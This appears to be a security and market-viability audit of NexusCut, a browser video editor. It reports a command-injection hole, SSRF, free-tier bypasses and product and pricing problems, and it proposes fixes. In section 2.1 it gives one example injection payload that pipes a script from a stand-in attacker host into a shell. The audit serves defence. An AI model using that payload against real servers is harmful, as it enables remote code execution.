# NexusCut — Truth-Mode Audit & Market Viability Assessment
Date: 2026-10-08 · Scope: repo at `C:\Projects\NexusCut-Website\NexusCut` (branch `main`), live site nexuscut.io, local dev server

---

## 0. Verdict up front

**Product: a genuinely impressive solo-built web video editor that is nonetheless not yet a business.**
The engineering is real (server-side FFmpeg render pipeline with queue, Whisper captions, Stripe, Prisma, 116 pages that all build and lint clean). But there is one **critical, likely-exploitable security hole in the export endpoint**, the monetization surface has visible cracks (Pro tier not purchasable), scope is spread across ~10 product surfaces with no traction evidence, and the market it enters is brutally crowded with far better-funded incumbents. Market verdict: **viable as a niche tool, non-viable as currently positioned and prioritized.**

---

## 1. What is REAL (verified)

| Area | Evidence |
|---|---|
| Build & lint | `next build` exit 0, 116 static pages, compiled in 13.6s; `eslint` 0 errors / 1 warning |
| Core editor | `/editor` loads a working multitrack timeline UI: import, record, split/delete, captions, transitions, effects, Growth Mode, export |
| Export pipeline | Real server-side FFmpeg (2-pass: xfade concat → ASS caption burn), job queue (capacity 5, plan-based priority), real progress parsing from FFmpeg stderr, 1 GB upload cap, guest + free-tier limits |
| Auto-captions | Real Whisper (`whisper-1`, word-level timestamps) via ffmpeg audio extraction with sane fallbacks |
| AI features | OpenAI-backed hook generation, ScriptCut, TTS, translate; Pexels B-roll; Python `rembg` background removal |
| Billing | Stripe checkout + portal + webhook (352 lines: checkout, subscription created/updated/deleted → `isPro`/`planTier`) |
| Auth | Custom magic-link + password login, scrypt hashing with `timingSafeEqual`, httpOnly/Secure/SameSite=Lax cookies |
| Security headers | CSP, HSTS, X-Frame-Options, Permissions-Policy, Referrer-Policy all set in `next.config.ts` |
| SEO | `sitemap.ts` covers all ~45 routes; Google has indexed home, editor, pricing, blog, marketplace, pro, labs, help, tutorial… |
| Honesty cleanup | `/tools/nexus-dream` now explicitly says text-to-video is *not* available (search snippets still claim the old version) |
| Mobile app | Real Expo/React Native scaffold (`mobile/`: editor, timeline, paywall, Supabase) — waitlisted, not shipped |

Local dev DB (`prisma/dev.db`): 2 users, 5 projects, **0 waitlist entries, 0 purchases** (local only — production numbers live on the VPS and could not be verified from here).

---

## 2. CRITICAL — fix before anything else

### 2.1 Unauthenticated command injection in `/api/export` (likely RCE on the VPS)
`src/pages/api/export.ts` builds a shell string and runs it with `spawn(command, { shell: true })` (line 35). Multiple **client-controlled strings** are interpolated into that string without numeric coercion or escaping:

- `volume=${mainVolume}` (lines 543/545/555/557) — `mainVolume` is `formData.get('mainVolume') as string` (line ~131)
- `volume=${bgmVolume}` (line 603) — same pattern
- `volume=${segmentVolume}` (line 487) and `volume=${vol}` (line 622, `fx.volume` from client JSON)

Example shape of attack: `mainVolume=1"; curl http://attacker/x.sh | sh; #`
The endpoint requires **no authentication** (guest cookie is auto-created and even client-supplied — see 2.3), accepts any uploaded MP4, and returns 200 before the queued render runs the injected command.

**Fix direction:** never build shell strings — use `spawn(ffmpegPath, [args], { shell: false })` with an argument array; coerce every numeric field with `Number()` + `Number.isFinite` and reject otherwise; validate segment/caption JSON against strict zod-style schemas.

### 2.2 SSRF via B-roll download
`src/pages/api/export.ts` (~line 336): `fetch(seg.videoUrl)` takes a **raw client URL with no host/protocol validation** — while the *brand asset* fetcher in the same file (`fetchBrandAsset`) explicitly blocks localhost/RFC1918/link-local. An attacker can make the VPS fetch internal endpoints (e.g. cloud metadata, intranet) and the bytes land in a temp file used as render input.

### 2.3 Free-tier and identity bypasses
- `nexus_export_guest_id` cookie is **read and trusted verbatim** as the identity key: clearing it resets the 10-export monthly allowance; any value is upserted as a `User.clerkId` (attacker-chosen DB rows).
- `x-forwarded-for` is taken as the *first* value in the rate limiter (`src/lib/rateLimit.ts`), so a spoofed header bypasses IP limits; the limiter also **fails open** on DB errors.
- `/api/auth/login` has **no rate limiting** at all → password brute force is unthrottled (scrypt slows it, but nothing stops distributed attempts).
- Session IDs are stored in plaintext in the DB (`User.clerkId`) and last 1 year; a DB leak = instant session forgery.

### 2.4 Smaller security smells
- `captionFont` (free tier) is unvalidated client input used to build a filesystem path (`${captionFont}.ttf`) — path traversal write of a downloaded TTF.
- FFmpeg commands and last captions are written to `process.cwd()` (`ffmpeg-success.log`, `last-captions.srt`) on every export — clutter + info disclosure if the cwd is ever served.
- `script-src 'unsafe-inline'` weakens the otherwise decent CSP.

---

## 3. Product & quality problems a user will actually feel

1. **Pro ($29/mo) is not purchasable** — the pricing card renders **"Plan opening soon"** because `STRIPE_PRO_PLUS_PRICE_ID` is unset, while Creator and Agency are live. The plan that carries all the flagship features (Growth Mode, ScriptCut, Brand Kit) is the one you can't buy.
2. **Nav is cramped/broken at 1440px** — "My Downloads", "Growth Hub", "Log In" wrap onto two lines; editor header has a clipped green button and an unlabeled "Project Name:" field with an empty input.
3. **`alert()`-driven UX in the editor** — 13 native `alert()` calls for errors, sync confirmations and billing errors (VideoEditor.tsx). Native dialogs in a premium-priced tool feel amateur.
4. **Desktop/Mobile/Pad pages are waitlist-only** — honest, but the homepage nav advertises them as products.
5. **Tools split into two tiers of truth**: functional (auto-captions, animated subtitles, remove-background, image animation via FFmpeg, AI image via free `pollinations.ai`) vs. landing pages. Depending on a keyless third-party (pollinations) for a flagship tool is a single point of failure.
6. **Homepage claims that overreach**: "90% Faster than Premiere", "100% Total Control", "All your media, synced and saved securely" (media is actually local — the editor itself warns files are "not available on this device").
7. **Meta descriptions are duplicated** across editor/help/tutorial/terms ("Edit short-form video with an editable multitrack timeline…") — Google is already showing the repetition.
8. **Repo hygiene**: ~738 dirty git entries mixing real changes (Stripe/waitlist/schema) with dozens of one-off `upload_*.py`, `vps_*.txt`, build-error logs, Word temp files, and backup folders. `backend_backup_*` and `NexusCut-Backup-*` live inside the tree. Nothing is committed since `efa2775`, so a crash loses the Stripe/waitlist work.

## 4. Architecture risks (scale & cost)

- **Single 1 GB-RAM VPS, SQLite, one FFmpeg render at a time, queue capacity 5.** The code openly comments that "subtitles + xfade exceed 1GB VPS RAM". One long 1080p export can stall the *entire site*; 6 concurrent users get 429s. This caps usable concurrency at roughly "a handful of people".
- Exports are queued by plan tier (agency > pro > free) — good design — but the whole system is one `node` process on one box with local `/tmp` state (jobs vanish on restart).
- The Express `backend/server.js` (transcribe/remove-bg) and a Python dependency (`rembg`, `python`) are a second deployment surface that must stay alive on that same VPS; `eraser` route hardcodes `'python'` instead of the configured `PYTHON_EXECUTABLE` — likely broken in Linux prod.
- `.env.local` carries Stripe + OpenAI + unused Clerk keys; Clerk is dead weight (auth is custom) and should be rotated/removed.

---

## 5. Market viability assessment

### 5.1 The market is big — and swimming in sharks
- Video editing software market ≈ **$3.75B in 2026**, ~5.9% CAGR (Mordor). Browser-based editing is the fastest-growing slice (+40% adoption YoY).
- Short-form content demand is real and growing; CapCut backlash (paywall creep, ToS/privacy, US availability scares) is a genuine, documented migration trigger — "CapCut alternative" is a searched-for phrase with active Reddit threads in 2026.

**But the competitive set at NexusCut's exact position:**

| Competitor | Price | Strength |
|---|---|---|
| **CapCut** | Free (1080p) / $9.99–19.99 Pro | Incumbent, mobile+desktop+web, templates |
| **Canva** | Free / ~$15 | Distribution to non-editors, video is a feature |
| **Clipchamp** | Free in Windows | Pre-installed on millions of PCs |
| **Descript** | $24–65 | Transcript-based editing, podcasts |
| **Opus Clip** | $15–29 | The "turn long video into shorts" default |
| **VEED / Kapwing** | ~$20–30 | Browser editors with timelines + AI captions |
| **DaVinci Resolve** | Free (desktop) | Pro-grade, free |

### 5.2 Where NexusCut actually differs
The honest wedge: **"a real multitrack timeline in the browser, aimed at short-form, with word-by-word caption control and no watermark on free"** — i.e., *control* vs. Opus-style black boxes, *instant* vs. Premiere-style downloads. The homepage's own comparison block (vs. Opus, vs. Veed, vs. Premiere) is the right framing.

That is a **real but thin differentiation**: VEED and Kapwing also have browser timelines and captions; CapCut has all of it plus templates and a mobile app. There is no defensible moat — no proprietary model, no template/network effects (marketplace has no sellers yet), no distribution.

### 5.3 Pricing reality check
- Free tier (10 exports, 720p, no watermark) is **generous and credible** — the strongest commercial idea here.
- $12 Creator undercuts VEED/Kapwing and matches Opus — fine.
- $29 Pro is where the value is supposed to land (Growth Mode, ScriptCut, Brand Kit) — **and it can't be bought today**.
- $49 Agency against CapCut Pro at $9.99–19.99 is a hard sell without commercial-use proof points and case studies.
- The biggest pricing problem isn't the numbers, it's that **video editing's reference price is "$0"** (CapCut free, Clipchamp free, DaVinci free). Conversion will come from watermark-free-but-limited free → power users, not from feature checklists.

### 5.4 Traction & distribution — the actual killer
- No visible traction: fresh waitlist API, empty local DB, no press, domain indexed but with thin/duplicate metadata, one comparison page, no backlink moat. "site:nexuscut.io" returns indexed pages but the brand has essentially zero search demand.
- In this category, **distribution beats product**: CapCut/Canva win on bundling, Opus/Descript win on SEO+content+PLG loops. A solo dev shipping 12 tool landing pages is the right instinct, but they currently rank against entrenched content engines.
- Scope is the silent killer: web editor + desktop + mobile + pad + marketplace + affiliates + agency + academy + labs + challenge + repurposing service. Ten surfaces, one person, no revenue.

### 5.5 Verdict
- **As a product:** solid, real, and better than 90% of "AI video editor" wrappers — because the render pipeline and timeline are actually yours.
- **As a business today:** not yet viable. Nothing is being sold (Pro disabled, zero recorded purchases), the free tier can be farmed (2.3), one exploit away from a compromise (2.1), and the wedge is thin against free incumbents.
- **As a bet:** viable *if* it stops being a horizontal "everything" app and owns one narrow, painful, searchable job — e.g. *"word-by-word caption control for TikTok/Reels/Shorts in the browser, free to try, no watermark"* — with security fixed, Pro purchasable, and distribution focused on 1–2 channels.

---

## 6. Priority list (in order)

1. **Patch the export RCE + SSRF today** (argument-array `spawn`, numeric coercion, strict schema validation, hostname allowlist for all fetched URLs).
2. **Anti-abuse**: rate-limit `/api/auth/login` and `/api/export`, stop trusting raw guest cookie/XFF, hash session IDs.
3. **Unblock Pro checkout** (set `STRIPE_PRO_PLUS_PRICE_ID` or remove the plan from the page).
4. **Commit the real work** — split the 738 dirty entries: ship the Stripe/waitlist/schema changes, gitignore or archive the `*_*.py` / `vps_*.txt` scratch files.
5. **Fix the visible polish**: nav wrapping, editor header clutter, replace `alert()`s, dedupe meta descriptions, temper homepage claims.
6. **Reposition to one wedge** (captions/short-form control), kill or park the surfaces with zero users (marketplace, agency, pad) until the core converts.
7. **Capacity**: the 1 GB VPS + single-render queue is a cliff; either raise specs or move heavy renders to a queue worker/VM you can scale per-tenant before paid traffic arrives.

---
*Method: static code review of `src/` (editor, all API routes, auth, billing, rate limiting), production build + ESLint run, local dev-server walkthrough (home/editor/pricing at 1440px), live-site check (nexuscut.io), Google indexing check, and market research (Mordor/industry reports, competitor pricing 2026, Reddit/SEO demand signals). Production VPS metrics, real revenue and traffic could not be verified from this machine.*
